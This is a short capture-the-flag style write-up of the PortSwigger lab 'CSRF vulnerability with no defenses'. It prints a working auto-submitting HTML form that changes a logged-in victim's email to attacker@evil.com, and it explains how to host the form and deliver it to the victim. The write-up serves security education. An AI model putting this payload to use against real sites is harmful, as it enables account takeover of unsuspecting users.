# CSRF vulnerability with no defenses

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-no-defenses), you'll learn: CSRF vulnerability with no defenses! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221214234716.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221214234744.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221214234752.png)

In here, we can update our email address!

**Let's use Burp Suite to intercept the request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221214235015.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221214235052.png)

When we click the `Update email` button, it'll send a POST request to `/my-account/change-email` with the parameter `email`.

**However, there is no CSRF token to prevent other website to send the same request!**

**To exploit this CSRF vulnerbility, we can craft a web page that automatically send the same request!**

**Let's inspect how this website construct the form:**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <button class='button' type='submit'> Update email </button>
</form>
```

**Armed with above information, we can craft a form that perform the same request:**
```html
<html>
	<head>
		<title>CSRF-1</title>
	</head>
	<body>
		<form action="https://0a3700ea032ba1d8c2ef1284006800d3.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

**To host this page, I'll use python's module `http.server`:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/CSRF/CSRF-1]
└─# python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now, we can test it locally.

**If we go to `http://localhost/index.html`, it'll automatically send a POST request to `https://0a3700ea032ba1d8c2ef1284006800d3.web-security-academy.net/my-account/change-email` with the parameter `email`, and it's value is `attacker@evil.com`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221215000245.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221215000257.png)

It works, as we have the session cookie and that endpoint doesn't have any CSRF protections!!

**To change other users' email, we can use PortSwigger Lab's exploit server:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221215001415.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221215001503.png)

**Copy and paste our payload to `Body` and click `Store`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221215001711.png)

**Finally, we can click the `Deliver exploit to victim` button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221215001751.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-1/images/Pasted%20image%2020221215001810.png)

And we successfully changed a user's email address!

# What we've learned:

1. CSRF vulnerability with no defenses